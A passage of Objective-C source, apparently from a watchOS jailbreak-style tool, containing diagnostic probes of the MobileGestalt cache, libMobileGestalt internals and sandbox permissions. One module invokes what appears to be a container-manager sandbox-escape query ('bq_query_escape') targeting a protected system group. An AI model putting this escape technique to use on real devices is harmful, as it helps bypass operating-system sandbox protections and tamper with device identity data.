    id application = bq_send_id(applicationClass, "sharedApplication");
    if (!application) return nil;
    id scenes = bq_send_id(application, "connectedScenes");
    for (id scene in scenes) {
        if (![scene respondsToSelector:sel_registerName("windows")]) continue;
        for (id window in bq_send_id(scene, "windows")) {
            if (((BOOL (*)(id, SEL))objc_msgSend)(window, sel_registerName("isKeyWindow"))) return window;
        }
    }
    if ([application respondsToSelector:sel_registerName("windows")]) {
        return [bq_send_id(application, "windows") firstObject];
    }
    return nil;
}

void BQRespring(void) {
    dispatch_async(dispatch_get_main_queue(), ^{
        void *webKit = dlopen("/System/Library/Frameworks/WebKit.framework/WebKit", RTLD_NOW | RTLD_LOCAL);
        if (!webKit) { BQLog(@"respring: WebKit unavailable: %s", dlerror()); return; }
        Class viewClass = NSClassFromString(@"UIView");
        Class colorClass = NSClassFromString(@"UIColor");
        Class spinnerClass = NSClassFromString(@"UIActivityIndicatorView");
        Class configurationClass = NSClassFromString(@"WKWebViewConfiguration");
        Class webViewClass = NSClassFromString(@"WKWebView");
        NSString *path = [[NSBundle mainBundle] pathForResource:@"respring" ofType:@"html"];
        id win = bq_key_window();
        if (!win || !viewClass || !colorClass || !spinnerClass || !configurationClass || !webViewClass || !path.length) {
            BQLog(@"respring: required window, classes or HTML unavailable");
            return;
        }
        CGRect bounds = ((CGRect (*)(id, SEL))objc_msgSend)(win, sel_registerName("bounds"));
        id black = ((id (*)(id, SEL, CGRect))objc_msgSend)(bq_send_id(viewClass, "alloc"), sel_registerName("initWithFrame:"), bounds);
        ((void (*)(id, SEL, id))objc_msgSend)(black, sel_registerName("setBackgroundColor:"), bq_send_id(colorClass, "blackColor"));
        ((void (*)(id, SEL, NSUInteger))objc_msgSend)(black, sel_registerName("setAutoresizingMask:"), 18);
        ((void (*)(id, SEL, id))objc_msgSend)(win, sel_registerName("addSubview:"), black);
        id spinner = ((id (*)(id, SEL, NSInteger))objc_msgSend)(bq_send_id(spinnerClass, "alloc"), sel_registerName("initWithActivityIndicatorStyle:"), 101);
        ((void (*)(id, SEL, CGPoint))objc_msgSend)(spinner, sel_registerName("setCenter:"), CGPointMake(CGRectGetMidX(bounds), CGRectGetMidY(bounds)));
        ((void (*)(id, SEL, NSUInteger))objc_msgSend)(spinner, sel_registerName("setAutoresizingMask:"), 45);
        ((void (*)(id, SEL, id))objc_msgSend)(spinner, sel_registerName("setColor:"), bq_send_id(colorClass, "whiteColor"));
        ((void (*)(id, SEL))objc_msgSend)(spinner, sel_registerName("startAnimating"));
        ((void (*)(id, SEL, id))objc_msgSend)(black, sel_registerName("addSubview:"), spinner);
        gRespringOverlay = black;
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.25 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            id config = bq_send_id(configurationClass, "new");
            id preferences = bq_send_id(config, "defaultWebpagePreferences");
            ((void (*)(id, SEL, BOOL))objc_msgSend)(preferences, sel_registerName("setAllowsContentJavaScript:"), YES);
            id webView = ((id (*)(id, SEL, CGRect, id))objc_msgSend)(bq_send_id(webViewClass, "alloc"), sel_registerName("initWithFrame:configuration:"), bounds, config);
            ((void (*)(id, SEL, NSUInteger))objc_msgSend)(webView, sel_registerName("setAutoresizingMask:"), 18);
            ((void (*)(id, SEL, BOOL))objc_msgSend)(webView, sel_registerName("setUserInteractionEnabled:"), NO);
            ((void (*)(id, SEL, id, id))objc_msgSend)(win, sel_registerName("insertSubview:belowSubview:"), webView, black);
            NSURL *url = [NSURL fileURLWithPath:path];
            ((id (*)(id, SEL, id, id))objc_msgSend)(webView, sel_registerName("loadFileURL:allowingReadAccessToURL:"), url, url.URLByDeletingLastPathComponent);
            gRespringWebView = webView;
            BQLog(@"respring: NeoSpring started");
        });
    });
}

// ===== RO23_AUTORUN_DIAGNOSTIC_V1 =====
// Watch6,18 / watchOS 23U95
// READ ONLY: no system cache writes, no MCM escape, no rebuild.

#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <dlfcn.h>
#import <sys/sysctl.h>
#import <stdint.h>
#import <string.h>

typedef struct {
    const uint8_t *base;
    size_t length;
    char segment[17];
    char section[17];
} RO23ASection;

static void RO23AInspect(NSData *cache,
                         NSUInteger index,
                         NSUInteger slots) {
    if (index >= slots || cache.length != slots * 9) return;

    const uint8_t *p = cache.bytes;
    NSUInteger valueOffset = index * 8;
    NSUInteger presenceOffset = slots * 8 + index;

    uint32_t value = 0;
    memcpy(&value, p + valueOffset, sizeof(value));

    BQLog(@"RO23 SLOT index=%lu valueOffset=0x%lX "
          @"presenceOffset=0x%lX raw32=%u present=%u "
          @"(candidate only)",
          (unsigned long)index,
          (unsigned long)valueOffset,
          (unsigned long)presenceOffset,
          (unsigned int)value,
          (unsigned int)p[presenceOffset]);
}

static void RO23ARun(void) {
    char build[128] = {0};
    size_t buildSize = sizeof(build);

    if (sysctlbyname("kern.osversion",
                     build, &buildSize, NULL, 0) != 0) {
        BQLog(@"RO23 ERROR cannot read OS build");
        return;
    }

    BQLog(@"RO23 BEGIN build=%s pointerSize=%lu "
          @"READONLY=YES",
          build, (unsigned long)sizeof(void *));

    if (strcmp(build, "23U95") != 0 || sizeof(void *) != 4) {
        BQLog(@"RO23 SKIP unsupported build or architecture");
        return;
    }

    NSString *path =
        @"/private/var/containers/Shared/SystemGroup/"
         "systemgroup.com.apple.mobilegestaltcache/"
         "Library/Caches/com.apple.MobileGestalt.plist";

    NSData *plistData = [NSData dataWithContentsOfFile:path];

    if (plistData) {
        NSError *error = nil;
        id parsed =
          [NSPropertyListSerialization
              propertyListWithData:plistData
              options:NSPropertyListImmutable
              format:NULL
              error:&error];

        if ([parsed isKindOfClass:[NSDictionary class]]) {
            NSDictionary *dict = (NSDictionary *)parsed;
            NSData *cache = dict[@"CacheData"];

            BQLog(@"RO23 CACHE uuid=%@ plistBytes=%lu",
                  dict[@"CacheUUID"],
                  (unsigned long)plistData.length);

            if ([cache isKindOfClass:[NSData class]] &&
                cache.length % 9 == 0) {
                NSUInteger slots = cache.length / 9;

                BQLog(@"RO23 CACHE dataLength=%lu slots=%lu",
                      (unsigned long)cache.length,
                      (unsigned long)slots);

                RO23AInspect(cache, 103, slots);
                RO23AInspect(cache, 206, slots);
            }

            NSDictionary *extra = dict[@"CacheExtra"];
            if ([extra isKindOfClass:[NSDictionary class]]) {
                BQLog(@"RO23 CACHE DeviceBrandExtra=%@",
                      extra[@"fuKL2rMywRgQF1wowOA/cg"]
                      ? @"YES" : @"NO");
            }
        } else {
            BQLog(@"RO23 CACHE parse error=%@",
                  error.localizedDescription);
        }
    } else {
        BQLog(@"RO23 CACHE direct read unavailable");
    }

    // Load the library in this process, without modifying it.
    (void)dlopen("/usr/lib/libMobileGestalt.dylib",
                 RTLD_LAZY | RTLD_LOCAL);

    const struct mach_header *header = NULL;
    intptr_t slide = 0;

    for (uint32_t i = 0; i < _dyld_image_count(); i++) {
        const char *name = _dyld_get_image_name(i);
        if (name && strstr(name, "libMobileGestalt")) {
            header = _dyld_get_image_header(i);
            slide = _dyld_get_image_vmaddr_slide(i);
            BQLog(@"RO23 IMAGE %s", name);
            break;
        }
    }

    if (!header || header->magic != MH_MAGIC ||
        header->ncmds > 8192 ||
        header->sizeofcmds > 8388608) {
        BQLog(@"RO23 IMAGE unavailable or unsupported");
        return;
    }

    RO23ASection sections[192] = {0};
    size_t count = 0;

    const uint8_t *cursor = (const uint8_t *)(header + 1);
    const uint8_t *end = cursor + header->sizeofcmds;

    for (uint32_t i = 0; i < header->ncmds; i++) {
        if (cursor > end ||
            (size_t)(end - cursor) < sizeof(struct load_command))
            break;

        const struct load_command *lc =
            (const struct load_command *)cursor;

        if (lc->cmdsize < sizeof(*lc) ||
            lc->cmdsize > (size_t)(end - cursor))
            break;

        if (lc->cmd == LC_SEGMENT &&
            lc->cmdsize >= sizeof(struct segment_command)) {
            const struct segment_command *seg =
                (const struct segment_command *)cursor;

            if (seg->nsects <=
                (lc->cmdsize - sizeof(*seg)) / sizeof(struct section)) {
                const struct section *s =
                    (const struct section *)(seg + 1);

                for (uint32_t j = 0; j < seg->nsects; j++) {
                    if (count >= 192) break;
                    if (!s[j].size ||
                        s[j].size > 64 * 1024 * 1024) continue;

                    uint32_t kind = s[j].flags & SECTION_TYPE;
                    if (kind == S_ZEROFILL ||
                        kind == S_GB_ZEROFILL ||
                        kind == S_THREAD_LOCAL_ZEROFILL) continue;

                    RO23ASection *r = &sections[count++];
                    r->base = (const uint8_t *)
                        ((intptr_t)s[j].addr + slide);
                    r->length = s[j].size;

                    memcpy(r->segment, s[j].segname, 16);
                    memcpy(r->section, s[j].sectname, 16);
                }
            }
        }

        cursor += lc->cmdsize;
    }

    const char key[] = "fuKL2rMywRgQF1wowOA/cg";
    uint32_t keyAddress[12] = {0};
    size_t keyCount = 0;

    for (size_t i = 0; i < count; i++) {
        RO23ASection *s = &sections[i];

        if (strcmp(s->segment, "__TEXT") != 0)
            continue;

        if (strcmp(s->section, "__cstring") != 0 &&
            strcmp(s->section, "__const") != 0)
            continue;

        if (s->length < sizeof(key)) continue;

        for (size_t j = 0;
             j <= s->length - sizeof(key); j++) {
            if ((j == 0 || s->base[j - 1] == 0) &&
                memcmp(s->base + j, key, sizeof(key)) == 0) {
                if (keyCount < 12)
                    keyAddress[keyCount++] =
                        (uint32_t)(uintptr_t)(s->base + j);
            }
        }
    }

    BQLog(@"RO23 KEY exactMatches=%lu",
          (unsigned long)keyCount);

    NSUInteger references = 0;

    for (size_t i = 0; i < count; i++) {
        RO23ASection *s = &sections[i];

        if (strcmp(s->segment, "__DATA") != 0 &&
            strcmp(s->segment, "__DATA_CONST") != 0 &&
            strcmp(s->segment, "__AUTH") != 0 &&
            strcmp(s->segment, "__AUTH_CONST") != 0)
            continue;

        if (s->length < 4) continue;

        for (size_t j = 0; j <= s->length - 4; j += 4) {
            uint32_t pointer = 0;
            memcpy(&pointer, s->base + j, 4);

            BOOL match = NO;
            for (size_t k = 0; k < keyCount; k++) {
                if (pointer == keyAddress[k]) {
                    match = YES;
                    break;
                }
            }

            if (!match) continue;
            references++;

            // RO23_RECORD_V3: strictly read-only descriptor inspection.
            if (strcmp(s->section, "__const") == 0) {
                BQLog(@"RO23 V3 BEGIN keyRef=0x%lX",
                      (unsigned long)j);

                // Candidate strides only. Not verified layouts.
                for (size_t stride = 16;
                     stride <= 176;
                     stride += 4) {

                    if (j > s->length ||
                        s->length - j < stride + 4)
                        continue;

                    const uint8_t *tail =
                        s->base + j + stride - 8;

                    uint16_t slot = 0;
                    uint32_t type = 0;
                    uint32_t nextPointer = 0;

                    memcpy(&slot, tail + 2, 2);
                    memcpy(&type, tail + 4, 4);
                    memcpy(&nextPointer,
                           s->base + j + stride, 4);

                    BOOL nextInCString = NO;

                    for (size_t t = 0; t < count; t++) {
                        RO23ASection *cs = &sections[t];

                        if (strcmp(cs->segment, "__TEXT") ||
                            strcmp(cs->section, "__cstring"))
                            continue;

                        uintptr_t start =
                            (uintptr_t)cs->base;
                        uintptr_t target =
                            (uintptr_t)nextPointer;

                        if (target >= start &&
                            target - start < cs->length) {
                            nextInCString = YES;
                            break;
                        }
                    }

                    if (nextInCString ||
                        (slot == 103 && type == 5) ||
                        stride == 32 ||
                        stride == 64 ||
                        stride == 80 ||
                        stride == 160) {

                        BQLog(
                          @"RO23 V3 STRIDE=%lu "
                           "flags=%u index=%u type=%u "
                           "nextKey=0x%08X "
                           "nextCString=%d "
                           "HYPOTHESIS_ONLY",
                          (unsigned long)stride,
                          (unsigned int)tail[0],
                          (unsigned int)slot,
                          (unsigned int)type,
                          (unsigned int)nextPointer,
                          nextInCString);
                    }
                }

                // Hex window surrounding the DeviceBrand key pointer.
                for (int rel = -32; rel <= 176; rel += 16) {
                    int64_t off = (int64_t)j + rel;

                    if (off < 0 ||
                        (uint64_t)off + 16 > s->length)
                        continue;

                    NSMutableString *hex =
                        [NSMutableString string];

                    for (int k = 0; k < 16; k++) {
                        [hex appendFormat:@"%02X ",
                          s->base[off + k]];
                    }

                    BQLog(@"RO23 V3 HEX rel=%+d %@",
                          rel, hex);
                }

                BQLog(@"RO23 V3 END noSystemWrites=YES");
            }

            if (references <= 12) {
                size_t start = j > 24 ? j - 24 : 0;
                size_t finish =
                    j + 48 < s->length ? j + 48 : s->length;

                NSMutableString *hex = [NSMutableString string];

                for (size_t k = start; k < finish; k++)
                    [hex appendFormat:@"%02X ", s->base[k]];

                BQLog(@"RO23 REF section=%s,%s "
                      @"offset=0x%lX context=%@",
                      s->segment, s->section,
                      (unsigned long)j, hex);
            }
        }
    }

    BQLog(@"RO23 END keyReferences=%lu "
          @"indexNotYetVerified=YES systemWrites=NO",
          (unsigned long)references);
}

// Runs once after the watch app launches.
// No new button or Swift changes required.
// RO23: RO23AAutoRun automatic startup removed (explicit opt-in only).


// ===== END RO23_AUTORUN_DIAGNOSTIC_V1 =====

// ===== RO23_TYPE_CHECK_V2 =====
// Read-only: MGCopyAnswer only. Never modifies system cache.

typedef CFTypeRef (*RO23CopyAnswerFn)(CFStringRef, CFDictionaryRef);

static void RO23PrintAnswer(RO23CopyAnswerFn fn,
                            CFStringRef key,
                            NSString *label) {
    CFTypeRef value = fn(key, NULL);

    if (!value) {
        BQLog(@"RO23 TYPE %@ result=NULL", label);
        return;
    }

    CFTypeID type = CFGetTypeID(value);

    if (type == CFBooleanGetTypeID()) {
        BQLog(@"RO23 TYPE %@ kind=CFBoolean value=%d",
              label, CFBooleanGetValue((CFBooleanRef)value));
    } else if (type == CFNumberGetTypeID()) {
        int32_t number = 0;
        BOOL ok = CFNumberGetValue((CFNumberRef)value,
                                    kCFNumberSInt32Type,
                                    &number);
        BQLog(@"RO23 TYPE %@ kind=CFNumber value=%d "
              @"conversionOK=%d cfNumberType=%d byteSize=%ld",
              label, number, ok,
              (int)CFNumberGetType((CFNumberRef)value),
              (long)CFNumberGetByteSize((CFNumberRef)value));
    } else {
        BQLog(@"RO23 TYPE %@ kind=OTHER cfTypeID=%lu",
              label, (unsigned long)type);
    }

    CFRelease(value);
}

static void RO23TypeCheck(void) {
    char build[128] = {0};
    size_t length = sizeof(build);

    if (sysctlbyname("kern.osversion",
                     build, &length, NULL, 0) != 0 ||
        strcmp(build, "23U95") != 0 ||
        sizeof(void *) != 4) {
        BQLog(@"RO23 TYPE skipped: unsupported environment");
        return;
    }

    void *lib = dlopen("/usr/lib/libMobileGestalt.dylib",
                        RTLD_LAZY | RTLD_LOCAL);

    RO23CopyAnswerFn fn = lib
        ? (RO23CopyAnswerFn)dlsym(lib, "MGCopyAnswer")
        : NULL;

    if (!fn) {
        BQLog(@"RO23 TYPE MGCopyAnswer unavailable");
        return;
    }

    BQLog(@"RO23 TYPE BEGIN readOnly=YES");

    RO23PrintAnswer(fn, CFSTR("DeviceBrand"), @"plain");
    RO23PrintAnswer(fn,
        CFSTR("fuKL2rMywRgQF1wowOA/cg"), @"hashed");

    BQLog(@"RO23 TYPE END systemWrites=NO");
}

// RO23: RO23TypeCheckStart automatic startup removed (explicit opt-in only).


// ===== END RO23_TYPE_CHECK_V2 =====


// ===== RO23_SANDBOX_V4 =====
// Read-only authorization diagnostic for watchOS 23U95.
// Never opens the MobileGestalt cache for writing.

typedef int (*RO23SandboxCheckFn)(
    pid_t, const char *, int, ...);

static RO23SandboxCheckFn RO23GetSandboxCheck(void) {
    void *symbol = dlsym(RTLD_DEFAULT, "sandbox_check");

    if (!symbol) {
        void *lib = dlopen(
            "/usr/lib/libsandbox.1.dylib",
            RTLD_LAZY | RTLD_LOCAL
        );
        if (lib) symbol = dlsym(lib, "sandbox_check");
    }

    return (RO23SandboxCheckFn)symbol;
}

static void RO23CheckPermission(
    RO23SandboxCheckFn check,
    NSString *label,
    NSString *path
) {
    if (!check || !path.length) {
        BQLog(@"RO23 V4 %@ sandbox_check unavailable",
              label);
        return;
    }

    const char *ops[] = {
        "file-read-data",
        "file-write-data",
        "file-write-create",
        "file-write-metadata"
    };

    for (int i = 0; i < 4; i++) {
        // 1 = SANDBOX_FILTER_PATH
        // This checks policy only; no file operations.
        int result = check(
            getpid(),
            ops[i],
            1,
            path.fileSystemRepresentation
        );

        BQLog(@"RO23 V4 %@ op=%s rc=%d %@",
              label,
              ops[i],
              result,
              result == 0 ? @"ALLOW" :
              result > 0 ? @"DENY" : @"ERROR");
    }
}

static void RO23CheckEntitlements(void) {
    typedef CFTypeRef (*TaskCreate)(CFAllocatorRef);
    typedef CFTypeRef (*TaskCopy)(
        CFTypeRef, CFStringRef, CFErrorRef *);

    void *security = dlopen(
        "/System/Library/Frameworks/Security.framework/Security",
        RTLD_LAZY | RTLD_LOCAL
    );

    if (!security) {
        BQLog(@"RO23 V4 entitlements unavailable");
        return;
    }

    TaskCreate create =
        (TaskCreate)dlsym(security, "SecTaskCreateFromSelf");

    TaskCopy copy =
        (TaskCopy)dlsym(
            security,
            "SecTaskCopyValueForEntitlement"
        );

    if (!create || !copy) {
        BQLog(@"RO23 V4 entitlement APIs unavailable");
        return;
    }

    CFTypeRef task = create(kCFAllocatorDefault);
    if (!task) return;

    NSArray<NSString *> *names = @[
        @"com.apple.security.application-groups",
        @"com.apple.security.system-groups",
        @"com.apple.security.system-group-containers"
    ];

    for (NSString *name in names) {
        CFTypeRef value = copy(
            task,
            (__bridge CFStringRef)name,
            NULL
        );

        BQLog(@"RO23 V4 entitlement %@ present=%d",
              name, value != NULL);

        if (value) CFRelease(value);
    }

    CFRelease(task);
}

static void RO23SandboxRun(void) {
    char build[128] = {0};
    size_t length = sizeof(build);

    if (sysctlbyname("kern.osversion",
                     build, &length, NULL, 0) != 0 ||
        strcmp(build, "23U95") != 0) {
        BQLog(@"RO23 V4 unsupported build");
        return;
    }

    BQLog(@"RO23 V4 BEGIN build=%s READONLY=YES", build);

    BQCoreInit();
    RO23CheckEntitlements();

    RO23SandboxCheckFn check = RO23GetSandboxCheck();

    NSString *target =
      @"/private/var/containers/Shared/SystemGroup/"
       "systemgroup.com.apple.mobilegestaltcache/"
       "Library/Caches/com.apple.MobileGestalt.plist";

    NSString *control = BQLogPath();

    RO23CheckPermission(check, @"MG_BEFORE", target);
    RO23CheckPermission(check, @"APP_CONTROL", control);

    bq_load_mcm();

    // Direct Class 13 query for the existing system group.
    // No path traversal, symlink, or system-file mutation.
    int64_t handle = bq_query_escape(
        13,
        @"systemgroup.com.apple.mobilegestaltcache",
        YES,
        3,
        @"",
        0x0800000000ULL,
        @"RO23-class13-direct-26flags",
        NULL
    );

    BQLog(@"RO23 V4 CLASS13 tokenConsumed=%d handle=%lld",
          handle >= 0, (long long)handle);

    RO23CheckPermission(check, @"MG_AFTER", target);

    if (handle >= 0 && g.release) {
        g.release(handle);
    }

    BQLog(@"RO23 V4 END systemWrites=NO");
}

// RO23: RO23SandboxStart automatic startup removed (explicit opt-in only).


// ===== END RO23_SANDBOX_V4 =====


// ===== RO23_HELPER_V5 =====
// Watch6,18 / watchOS 23U95
// No XPC messages, no system writes, no rebuild.

#import <mach/mach.h>
#import <dlfcn.h>
#import <sys/sysctl.h>

typedef kern_return_t (*RO23TaskSpecialPortFn)(
    mach_port_t,
    int,
    mach_port_t *
);

typedef kern_return_t (*RO23BootstrapLookupFn)(
    mach_port_t,
    const char *,
    mach_port_t *
);

static void RO23HelperProbe(void) {
    char build[128] = {0};
    size_t length = sizeof(build);

    if (sysctlbyname(
            "kern.osversion",
            build, &length, NULL, 0) != 0 ||
        strcmp(build, "23U95") != 0) {
        BQLog(@"RO23 V5 unsupported build");
        return;
    }

    BQLog(@"RO23 V5 BEGIN readOnly=YES build=%s", build);

    RO23TaskSpecialPortFn getPort =
        (RO23TaskSpecialPortFn)
        dlsym(RTLD_DEFAULT, "task_get_special_port");

    RO23BootstrapLookupFn lookup =
        (RO23BootstrapLookupFn)
        dlsym(RTLD_DEFAULT, "bootstrap_look_up");

    BQLog(@"RO23 V5 symbols taskPort=%d lookup=%d",
          getPort != NULL, lookup != NULL);

    if (!getPort || !lookup) {
        BQLog(@"RO23 V5 UNAVAILABLE: required symbols missing");
        BQLog(@"RO23 V5 END noSystemWrites=YES");
        return;
    }

    mach_port_t bootstrap = MACH_PORT_NULL;

    // TASK_BOOTSTRAP_PORT = 4
    kern_return_t kr = getPort(
        mach_task_self(),
        4,
        &bootstrap
    );

    BQLog(@"RO23 V5 bootstrap kr=%d valid=%d",
          kr, MACH_PORT_VALID(bootstrap));

    if (kr != KERN_SUCCESS ||
        !MACH_PORT_VALID(bootstrap)) {
        BQLog(@"RO23 V5 END noSystemWrites=YES");
        return;
    }

    const char *serviceName =
        "com.apple.mobilegestalt.xpc";

    mach_port_t service = MACH_PORT_NULL;

    // Lookup only. No service method is invoked.
    kern_return_t result = lookup(
        bootstrap,
        serviceName,
        &service
    );

    BQLog(@"RO23 V5 service=%s lookupKR=%d valid=%d",
          serviceName,
          result,
          MACH_PORT_VALID(service));

    if (MACH_PORT_VALID(service)) {
        mach_port_deallocate(mach_task_self(), service);
    }

    mach_port_deallocate(mach_task_self(), bootstrap);

    BQLog(@"RO23 V5 END messagesSentToHelper=0 "
          @"systemWrites=NO rebuild=NO");
}

// RO23: RO23HelperStart automatic startup removed (explicit opt-in only).


// ===== END RO23_HELPER_V5 =====


// ===== RO23_V6_XPC_QUERY =====
// A single read-only XPC request. No cache management calls.

#import <objc/runtime.h>
#import <objc/message.h>

@protocol RO23MGReadOnlyProtocol
- (void)getServerAnswerForQuestion:(NSString *)question
                             reply:(void (^)(NSDictionary *answer))reply;
@end

static void RO23V6Run(void) {
    char build[128] = {0};
    size_t length = sizeof(build);

    if (sysctlbyname("kern.osversion",
                     build, &length, NULL, 0) != 0 ||
        strcmp(build, "23U95") != 0) {
        BQLog(@"RO23 V6 SKIP unsupported build");
        return;
    }

    BQLog(@"RO23 V6 BEGIN query=DeviceBrand "
          @"systemWrites=NO");

    Class connClass = NSClassFromString(@"NSXPCConnection");
    Class ifaceClass = NSClassFromString(@"NSXPCInterface");

    BQLog(@"RO23 V6 runtime connection=%d interface=%d",
          connClass != Nil, ifaceClass != Nil);

    if (!connClass || !ifaceClass) {
        BQLog(@"RO23 V6 UNAVAILABLE XPC classes missing");
        return;
    }

    SEL initSEL =
        NSSelectorFromString(@"initWithMachServiceName:options:");
    SEL interfaceSEL =
        NSSelectorFromString(@"interfaceWithProtocol:");
    SEL setInterfaceSEL =
        NSSelectorFromString(@"setRemoteObjectInterface:");
    SEL resumeSEL = NSSelectorFromString(@"resume");
    SEL proxySEL =
        NSSelectorFromString(@"remoteObjectProxyWithErrorHandler:");

    if (![connClass instancesRespondToSelector:initSEL] ||
        ![connClass instancesRespondToSelector:setInterfaceSEL] ||
        ![connClass instancesRespondToSelector:resumeSEL] ||
        ![connClass instancesRespondToSelector:proxySEL] ||
        ![ifaceClass respondsToSelector:interfaceSEL]) {
        BQLog(@"RO23 V6 UNAVAILABLE required XPC selectors missing");
        return;
    }

    id connection = ((id (*)(id, SEL, NSString *, NSUInteger))
        objc_msgSend)(
            [connClass alloc],
            initSEL,
            @"com.apple.mobilegestalt.xpc",
            0
        );

    if (!connection) {
        BQLog(@"RO23 V6 ERROR connection allocation failed");
        return;
    }

    id remoteInterface = ((id (*)(id, SEL, Protocol *))
        objc_msgSend)(
            ifaceClass,
            interfaceSEL,
            @protocol(RO23MGReadOnlyProtocol)
        );

    if (!remoteInterface) {
        BQLog(@"RO23 V6 ERROR interface creation failed");
        return;
    }

    ((void (*)(id, SEL, id))objc_msgSend)(
        connection, setInterfaceSEL, remoteInterface
    );

    ((void (*)(id, SEL))objc_msgSend)(
        connection, resumeSEL
    );

    id errorHandler = ^(NSError *error) {
        BQLog(@"RO23 V6 XPC ERROR code=%ld domain=%@",
              (long)error.code,
              error.domain);
    };

    id proxy = ((id (*)(id, SEL, id))objc_msgSend)(
        connection, proxySEL, errorHandler
    );

    if (!proxy) {
        BQLog(@"RO23 V6 ERROR remote proxy unavailable");
        ((void (*)(id, SEL))objc_msgSend)(
            connection, NSSelectorFromString(@"invalidate")
        );
        return;
    }

    BQLog(@"RO23 V6 sending read-only DeviceBrand query");

    void (^replyHandler)(NSDictionary *) =
    ^(NSDictionary *reply) {
        if (![reply isKindOfClass:[NSDictionary class]]) {
            BQLog(@"RO23 V6 REPLY unexpected response class=%@",
                  reply ? NSStringFromClass([reply class]) : @"nil");
            return;
        }

        id answer = reply[@"answer"];
        id error = reply[@"error"];

        BQLog(@"RO23 V6 REPLY received=YES error=%@ "
              @"answerClass=%@",
              error ?: @"(none)",
              answer ? NSStringFromClass([answer class]) : @"nil");

        if ([answer isKindOfClass:[NSNumber class]]) {
            BQLog(@"RO23 V6 DeviceBrand=%@",
                  answer);
        }
    };

    ((void (*)(id, SEL, NSString *, id))objc_msgSend)(
        proxy,
        NSSelectorFromString(@"getServerAnswerForQuestion:reply:"),
        @"DeviceBrand",
        replyHandler
    );

    // Bounded observation window. Prevents an indefinite wait.
    dispatch_after(
        dispatch_time(DISPATCH_TIME_NOW,
                      (int64_t)(10 * NSEC_PER_SEC)),
        dispatch_get_global_queue(QOS_CLASS_UTILITY, 0),
        ^{
            BQLog(@"RO23 V6 END observationWindowClosed=YES "
                  @"cacheRebuild=NO");
            ((void (*)(id, SEL))objc_msgSend)(
                connection,
                NSSelectorFromString(@"invalidate")
            );
        }
    );
}

// RO23: RO23V6Start automatic startup removed (explicit opt-in only).


// ===== END RO23_V6_XPC_QUERY =====


// ===== RO23_V7_XPC_COMPARE =====
// Four read-only queries, compared with local MGCopyAnswer.

static void RO23V7Run(void) {
    char build[128] = {0};
    size_t length = sizeof(build);

    if (sysctlbyname("kern.osversion",
                     build, &length, NULL, 0) != 0 ||
        strcmp(build, "23U95") != 0) {
        BQLog(@"RO23 V7 SKIP build mismatch");
        return;
    }

    BQLog(@"RO23 V7 BEGIN noSystemWrites=YES");

    NSArray<NSDictionary *> *questions = @[
        @{@"label": @"DeviceBrand-plain",
          @"key": @"DeviceBrand"},
        @{@"label": @"DeviceBrand-hash",
          @"key": @"fuKL2rMywRgQF1wowOA/cg"},
        @{@"label": @"BuildVersion",
          @"key": @"BuildVersion"},
        @{@"label": @"ProductType",
          @"key": @"ProductType"}
    ];

    void *mg = dlopen(
        "/usr/lib/libMobileGestalt.dylib",
        RTLD_NOW | RTLD_LOCAL
    );

    CFTypeRef (*copyAnswer)(CFStringRef, CFDictionaryRef) =
        mg ? dlsym(mg, "MGCopyAnswer") : NULL;

    for (NSDictionary *item in questions) {
        NSString *label = item[@"label"];
        NSString *key = item[@"key"];

        CFTypeRef result = copyAnswer ?
            copyAnswer((__bridge CFStringRef)key, NULL) : NULL;

        NSString *type = result ?
            NSStringFromClass([(__bridge id)result class]) :
            @"nil";

        if (result &&
            CFGetTypeID(result) == CFNumberGetTypeID()) {
            int32_t value = 0;
            CFNumberGetValue(
                (CFNumberRef)result,
                kCFNumberSInt32Type,
                &value
            );
            BQLog(@"RO23 V7 LOCAL %@ class=%@ number=%d",
                  label, type, value);
        } else {
            BQLog(@"RO23 V7 LOCAL %@ class=%@",
                  label, type);
        }

        if (result) CFRelease(result);
    }

    if (mg) dlclose(mg);

    Class connClass = NSClassFromString(@"NSXPCConnection");
    Class ifaceClass = NSClassFromString(@"NSXPCInterface");

    if (!connClass || !ifaceClass) {
        BQLog(@"RO23 V7 XPC unavailable");
        return;
    }

    id connection = ((id (*)(id, SEL, NSString *, NSUInteger))
        objc_msgSend)(
            [connClass alloc],
            NSSelectorFromString(@"initWithMachServiceName:options:"),
            @"com.apple.mobilegestalt.xpc",
            0
        );

    if (!connection) {
        BQLog(@"RO23 V7 connection creation failed");
        return;
    }

    id iface = ((id (*)(id, SEL, Protocol *))
        objc_msgSend)(
            ifaceClass,
            NSSelectorFromString(@"interfaceWithProtocol:"),
            @protocol(RO23MGReadOnlyProtocol)
        );

    ((void (*)(id, SEL, id))objc_msgSend)(
        connection,
        NSSelectorFromString(@"setRemoteObjectInterface:"),
        iface
    );

    ((void (*)(id, SEL))objc_msgSend)(
        connection,
        NSSelectorFromString(@"resume")
    );

    id handler = ^(NSError *error) {
        BQLog(@"RO23 V7 XPC TRANSPORT ERROR domain=%@ code=%ld",
              error.domain, (long)error.code);
    };

    id proxy = ((id (*)(id, SEL, id))objc_msgSend)(
        connection,
        NSSelectorFromString(@"remoteObjectProxyWithErrorHandler:"),
        handler
    );

    if (!proxy) {
        BQLog(@"RO23 V7 no remote proxy");
        ((void (*)(id, SEL))objc_msgSend)(
            connection, NSSelectorFromString(@"invalidate")
        );
        return;
    }

    for (NSDictionary *item in questions) {
        NSString *label = item[@"label"];
        NSString *key = item[@"key"];

        BQLog(@"RO23 V7 SEND %@", label);

        void (^reply)(NSDictionary *) =
        ^(NSDictionary *response) {
            if (![response isKindOfClass:[NSDictionary class]]) {
                BQLog(@"RO23 V7 REPLY %@ invalidResponse",
                      label);
                return;
            }

            id err = response[@"error"];
            id answer = response[@"answer"];

            BQLog(@"RO23 V7 DETAIL %@ keys=%@ logString=%@",
                  label,
                  [response allKeys],
                  response[@"logString"] ?: @"(nil)");

            NSString *type = answer ?
                NSStringFromClass([answer class]) : @"nil";

            BQLog(@"RO23 V7 REPLY %@ error=%@ class=%@",
                  label, err ?: @"(none)", type);

            if ([answer isKindOfClass:[NSNumber class]]) {
                BQLog(@"RO23 V7 REPLY %@ number=%@",
                      label, answer);
            }
        };

        ((void (*)(id, SEL, NSString *, id))objc_msgSend)(
            proxy,
            NSSelectorFromString(
                @"getServerAnswerForQuestion:reply:"
            ),
            key,
            reply
        );
    }

    dispatch_after(
        dispatch_time(DISPATCH_TIME_NOW,
                      (int64_t)(15 * NSEC_PER_SEC)),
        dispatch_get_global_queue(QOS_CLASS_UTILITY, 0),
        ^{
